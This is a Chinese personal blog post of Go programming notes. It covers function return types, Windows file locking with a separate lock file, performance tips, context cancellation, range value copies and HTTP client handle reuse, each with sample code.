<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta name="description" content="CrossTime的个人博客" />
      
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> CrossTime的个人博客</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
      />
      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
    <main class="content on">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/image.jpeg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">CrossTime的个人博客</a></h1>
      <div id="subtitle-box">
        
          <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>




<!-- Subtitle -->

<div id="main">
  <section class="outer">
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-study-golang-record-2"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/18/study-golang-record-2/"
    >Golang学习记录之二</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/18/study-golang-record-2/" class="article-date">
  <time datetime="2022-04-18T06:38:41.000Z" itemprop="datePublished">2022-04-18</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>​    基于上一篇文章的补充，后续若遇到其他坑或者有新的小技巧会继续补充的哈(。・∀・)ノ</p>
<h2 id="1、函数的返回值可以是一个函数"><a href="#1、函数的返回值可以是一个函数" class="headerlink" title="1、函数的返回值可以是一个函数"></a>1、函数的返回值可以是一个函数</h2><p>在golang中，需要对每个函数定义好返回值的类型（如果有返回值的话），其中返回值的类型可以是一个函数类型</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SprintFunc</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">(a ...&#123;&#125;)</span></span> <span class="type">string</span> &#123;     <span class="comment">// 将func(a ...&#123;&#125;) string作为函数返回类型</span></span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(a ...<span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Sprint(a...)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	b := SprintFunc()                       <span class="comment">// 这里变量b的类型为func(a ...&#123;&#125;) string，是一个函数类型</span></span><br><span class="line">	fmt.Println(b(<span class="string">&quot;aa&quot;</span>, <span class="string">&quot;bb&quot;</span>))              <span class="comment">// 调用函数b</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2、windows文件锁"><a href="#2、windows文件锁" class="headerlink" title="2、windows文件锁"></a>2、windows文件锁</h2><p>在很多场景下，会遇到多个协程同时写文件的操作，需要用到文件锁以保证写入顺序</p>
<p>golang的syscall库内置了设置文件锁函数Flock，其函数原理是调用系统的flock这个api，但只能在linux平台内使用，windows上没有flock这个api</p>
<p>在github上搜索第三方库，发现1个库：github.com&#x2F;gofrs&#x2F;flock（其余还有很多其他的库，如github.com&#x2F;zbiljic&#x2F;go-filelock， github.com&#x2F;juju&#x2F;fslock ，都大同小异）</p>
<p>但使用方式与linux的略有不同，linux文件锁的参数是打开的文件句柄，代码如下所示：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f, err := os.OpenFile(file, os.O_WRONLY|os.O_APPEND, <span class="number">0666</span>)</span><br><span class="line">syscall.Flock(<span class="type">int</span>(f.Fd()), syscall.LOCK_EX)  <span class="comment">// 文件上锁</span></span><br><span class="line">_, _ = io.WriteString(f, <span class="string">&quot;123\n&quot;</span>)            <span class="comment">// 文件写入</span></span><br><span class="line">syscall.Flock(<span class="type">int</span>(f.Fd()), syscall.LOCK_UN)  <span class="comment">// 文件解锁</span></span><br></pre></td></tr></table></figure>

<p>文件上锁之后，仍然可以对该文件句柄进行写入操作，只是其他协程再尝试上锁会被阻塞（句柄不同）</p>
<p>但上面那个github.com&#x2F;gofrs&#x2F;flock   在windows平台上的参数是文件路径</p>
<p>如果先上锁再进行文件写入操作，则会返回写入失败（写入文件前都会先给文件上锁的吧。。）</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">write</span><span class="params">(file <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	</span><br><span class="line">	lock := fslock.New(file)</span><br><span class="line">	lockErr := lock.Lock()     <span class="comment">// 文件上锁</span></span><br><span class="line">	<span class="keyword">if</span> lockErr != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(lockErr)</span><br><span class="line">	&#125;</span><br><span class="line">	f, err := os.OpenFile(file, os.O_WRONLY|os.O_APPEND, <span class="number">0666</span>)</span><br><span class="line">	<span class="keyword">defer</span> f.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;open err: &quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	_, _ = io.WriteString(f, <span class="string">&quot;123\n&quot;</span>)   <span class="comment">// 会返回写入失败</span></span><br><span class="line">	lock.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	write(<span class="string">&quot;123.txt&quot;</span>)</span><br><span class="line">	write(<span class="string">&quot;123.txt&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">The process cannot access the file because it is being used by another process.</span><br></pre></td></tr></table></figure>

<p>windows上文件锁具体如何配合写文件，这些github上都没写（这一点好坑，害得我研究了几天）</p>
<p>某一天突然灵光一闪，想到了如何使用，那就是创建另外一个文件当作文件锁，在获取到文件锁之后再写到输出文件里，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gofrs/flock&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/remeh/sizedwaitgroup&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">write</span><span class="params">(file <span class="type">string</span>, wgscan *sizedwaitgroup.SizedWaitGroup)</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> wgscan.Done()</span><br><span class="line">	fmt.Println(file)</span><br><span class="line">	f, err := os.OpenFile(file, os.O_WRONLY|os.O_APPEND, <span class="number">0666</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;open err: &quot;</span>, err.Error())</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;try to write 123&quot;</span>)</span><br><span class="line">	fileLock := flock.New(<span class="string">&quot;temp/outputFile.pid&quot;</span>)      <span class="comment">// 创建另一个文件outputFile.pid当做文件锁，</span></span><br><span class="line">                                                      <span class="comment">// 对该文件上锁，如果能够上锁，则认为当前没有协程对123.txt进行写操作，则可以放心写入</span></span><br><span class="line">	<span class="keyword">for</span> &#123;                                             <span class="comment">// TryLock会尝试获取文件锁，但获取失败时不会堵塞，所以这里需要使用循环来不断尝试获取</span></span><br><span class="line">		locked, err := fileLock.TryLock()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			util.Error(<span class="string">&quot;output file lock failed: &quot;</span>, err.Error(), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> locked &#123;                                   <span class="comment">// 如果成功获取到文件锁，则退出循环</span></span><br><span class="line">			<span class="keyword">defer</span> fileLock.Unlock()                   <span class="comment">// 函数退出时会解锁</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;write 123&quot;</span>)</span><br><span class="line">	_, err2 := io.WriteString(f, <span class="string">&quot;123\n&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err2 != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;write:&quot;</span>, err2)</span><br><span class="line">	&#125;</span><br><span class="line">	f.Close()</span><br><span class="line">	fmt.Println(<span class="string">&quot;write 123 done&quot;</span>)</span><br><span class="line">	time.Sleep(<span class="number">3</span> * time.Second)</span><br><span class="line">	fmt.Println(<span class="string">&quot;quit write&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	wgscan := sizedwaitgroup.New(<span class="number">2</span>)                   <span class="comment">// 创建两个协程</span></span><br><span class="line">	pwd, _ := os.Getwd()</span><br><span class="line">	wgscan.Add()</span><br><span class="line">	<span class="keyword">go</span> write(filepath.Join(pwd,<span class="string">&quot;123.txt&quot;</span>), &amp;wgscan)   <span class="comment">// 往123.txt里写文件</span></span><br><span class="line">	wgscan.Add()</span><br><span class="line">	<span class="keyword">go</span> write(filepath.Join(pwd,<span class="string">&quot;123.txt&quot;</span>), &amp;wgscan)</span><br><span class="line">	wgscan.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3、性能提升"><a href="#3、性能提升" class="headerlink" title="3、性能提升"></a>3、性能提升</h2><p>当开发一些比较大的程序时，性能提升就显得比较重要了（否则运行慢导致没人用&#x2F;(ㄒoㄒ)&#x2F;~~）</p>
<p>下面是一些提升的心得：</p>
<p><strong>1）用到比较大的结构体作为函数返回值&#x2F;参数时，使用指针形式（否则会拷贝一份到内存中，徒增消耗）</strong></p>
<p><strong>2）在构造字符串时，对于拼接比较多的情况，比如</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a,b,c,d,e,f,g <span class="type">string</span></span><br><span class="line">output := a+b+c+d+e+f+g   <span class="comment">// 字符串拼接操作</span></span><br><span class="line">fmt.Println(output)</span><br></pre></td></tr></table></figure>

<p>这种拼接构造字符串效率其实是比较低的，使用专门的构造字符串的结构<code>bytes.Buffer</code>，效率会更高</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a,b,c,d,e,f,g <span class="type">string</span></span><br><span class="line">output := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">buff.WriteString(a)</span><br><span class="line">buff.WriteString(b)</span><br><span class="line">buff.WriteString(c)</span><br><span class="line">buff.WriteString(d)</span><br><span class="line">buff.WriteString(e)</span><br><span class="line">buff.WriteString(f)</span><br><span class="line">buff.WriteString(g)</span><br><span class="line">fmt.Println(buff.String())</span><br></pre></td></tr></table></figure>

<p><strong>3）使用预分配</strong></p>
<p>因为golang中切片是不定长的，可以使用append函数将数据插入到切片中，但其实插入到切片之前，golang会先检查切片的长度是否达到了容量上限，如果达到了上限，是需要先申请内存，对切片进行扩容操作，再进行数据插入</p>
<p>如果已经知道切片长度，则使用make函数提前一次性申请内存空间，再进行赋值操作效率会更高</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n := <span class="number">10</span></span><br><span class="line">src := <span class="built_in">make</span>([]<span class="type">int</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无预分配: 162 ns/op</span></span><br><span class="line"><span class="keyword">var</span> dst []<span class="type">int</span></span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>; i&lt;n; i++ &#123;</span><br><span class="line">	dst = <span class="built_in">append</span>(dst, src[i])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 预分配，32.3 ns/op，提升了5倍</span></span><br><span class="line">dst2 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, n)</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>; i&lt;n; i++ &#123;</span><br><span class="line">	dst2 = <span class="built_in">append</span>(dst2, src[i])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://wudaijun.com/2019/09/go-performance-optimization/">https://wudaijun.com/2019/09/go-performance-optimization/</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1165922">https://cloud.tencent.com/developer/article/1165922</a></p>
<h2 id="4、context之WithCancel的使用"><a href="#4、context之WithCancel的使用" class="headerlink" title="4、context之WithCancel的使用"></a>4、context之WithCancel的使用</h2><p>在golang中会经常使用协程来进行并发处理，对于想控制协程退出的场景下，需要使用context来控制协程何时退出</p>
<p>context.WithCancel()函数接受一个 Context 并返回其子Context和取消函数cancel，当调用cancel取消函数时，所有位于context(函数参数)下面的子context(函数返回值)都会收到消息而退出，代码示例如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 父context(利用根context得到)</span></span><br><span class="line">	ctx, cancel := context.WithCancel(context.Background())</span><br><span class="line"> </span><br><span class="line">	<span class="comment">// 父context的子协程</span></span><br><span class="line">	<span class="keyword">go</span> watch1(ctx)</span><br><span class="line"> </span><br><span class="line">	<span class="comment">// 子context，注意：这里虽然也返回了cancel的函数对象，但是未使用</span></span><br><span class="line">	valueCtx, _ := context.WithCancel(ctx)</span><br><span class="line">	<span class="comment">// 子context的子协程</span></span><br><span class="line">	<span class="keyword">go</span> watch2(valueCtx)</span><br><span class="line"> </span><br><span class="line">	fmt.Println(<span class="string">&quot;现在开始等待3秒,time=&quot;</span>, time.Now().Unix())</span><br><span class="line">	time.Sleep(<span class="number">3</span> * time.Second)</span><br><span class="line"> </span><br><span class="line">	<span class="comment">// 调用cancel()</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;等待3秒结束,调用cancel()函数&quot;</span>)</span><br><span class="line">	cancel()</span><br><span class="line"> </span><br><span class="line">	<span class="comment">// 再等待5秒看输出，可以发现父context的子协程和子context的子协程都会被结束掉</span></span><br><span class="line">	time.Sleep(<span class="number">5</span> * time.Second)</span><br><span class="line">	fmt.Println(<span class="string">&quot;最终结束,time=&quot;</span>, time.Now().Unix())</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 父context的协程</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">watch1</span><span class="params">(ctx context.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">select</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> &lt;-ctx.Done(): <span class="comment">//取出值即说明是结束信号</span></span><br><span class="line">			fmt.Println(<span class="string">&quot;收到信号，父context的协程退出,time=&quot;</span>, time.Now().Unix())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			fmt.Println(<span class="string">&quot;父context的协程监控中,time=&quot;</span>, time.Now().Unix())</span><br><span class="line">			time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 子context的协程</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">watch2</span><span class="params">(ctx context.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">select</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> &lt;-ctx.Done(): <span class="comment">//取出值即说明是结束信号</span></span><br><span class="line">			fmt.Println(<span class="string">&quot;收到信号，子context的协程退出,time=&quot;</span>, time.Now().Unix())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			fmt.Println(<span class="string">&quot;子context的协程监控中,time=&quot;</span>, time.Now().Unix())</span><br><span class="line">			time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">现在开始等待<span class="number">3</span>秒,time= <span class="number">1649582546</span></span><br><span class="line">子context的协程监控中,time= <span class="number">1649582546</span></span><br><span class="line">父context的协程监控中,time= <span class="number">1649582546</span></span><br><span class="line">父context的协程监控中,time= <span class="number">1649582547</span></span><br><span class="line">子context的协程监控中,time= <span class="number">1649582547</span></span><br><span class="line">子context的协程监控中,time= <span class="number">1649582548</span></span><br><span class="line">父context的协程监控中,time= <span class="number">1649582548</span></span><br><span class="line">等待<span class="number">3</span>秒结束,调用cancel()函数</span><br><span class="line">收到信号，父context的协程退出,time= <span class="number">1649582549</span></span><br><span class="line">收到信号，子context的协程退出,time= <span class="number">1649582549</span></span><br><span class="line">最终结束,time= <span class="number">1649582554</span></span><br></pre></td></tr></table></figure>

<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yzf279533105/article/details/107290645">https://blog.csdn.net/yzf279533105/article/details/107290645</a></p>
<h2 id="5、range是值拷贝出来的副本"><a href="#5、range是值拷贝出来的副本" class="headerlink" title="5、range是值拷贝出来的副本"></a>5、range是值拷贝出来的副本</h2><p>在使用range遍历slice或者map的时候，要注意的是，循环的值都是被range值拷贝出来的副本值</p>
<p>举个例子：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Test <span class="keyword">struct</span> &#123;</span><br><span class="line">    Index <span class="type">int</span></span><br><span class="line">    Num   <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t []Test</span><br><span class="line">    t = <span class="built_in">append</span>(t,Test&#123;Index:<span class="number">1</span>,Num:<span class="number">1</span>&#125;)</span><br><span class="line">    t = <span class="built_in">append</span>(t,Test&#123;Index:<span class="number">2</span>,Num:<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> t &#123;</span><br><span class="line">        v.Num += <span class="number">100</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _,v:= <span class="keyword">range</span> t&#123;</span><br><span class="line">        fmt.Println(v.Index,v.Num)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">2</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>因为这里的v已经不是原来t中的了，而是值拷贝出来的副本值，副本值，副本值！</p>
<p>当然，map中的结果也是一样</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]Test)</span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> m &#123;</span><br><span class="line">    v.Num += <span class="number">100</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了解决这个问题，可以使用指针</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t []*Test</span><br><span class="line">t = <span class="built_in">append</span>(t,&amp;Test&#123;Index:<span class="number">1</span>,Num:<span class="number">1</span>&#125;)</span><br><span class="line">t = <span class="built_in">append</span>(t,&amp;Test&#123;Index:<span class="number">2</span>,Num:<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> t &#123;</span><br><span class="line">    v.Num += <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span> <span class="number">101</span></span><br><span class="line"><span class="number">2</span> <span class="number">102</span></span><br></pre></td></tr></table></figure>

<p>对于切片来说，可以使用下标来修改数组的值，在golang中通过下标访问（类似于基址寻址）</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i, _ := <span class="keyword">range</span> t &#123;</span><br><span class="line">    t[i].Num += <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span> <span class="number">101</span></span><br><span class="line"><span class="number">2</span> <span class="number">102</span></span><br></pre></td></tr></table></figure>



<h2 id="6、句柄"><a href="#6、句柄" class="headerlink" title="6、句柄"></a>6、句柄</h2><p>在linux中，打开文件的时候会产生一个句柄，但在进行socket连接时也会产生一个句柄，如果socket没有断开连接的话  会导致文件句柄过多而产生异常</p>
<p>在使用协程进行并发式的http请求时，建议创建一个全局的http.Client，使用默认的transport配置</p>
<p>如果忽略ssl证书问题的需求，可以复制一份默认配置，添加上自己的配置</p>
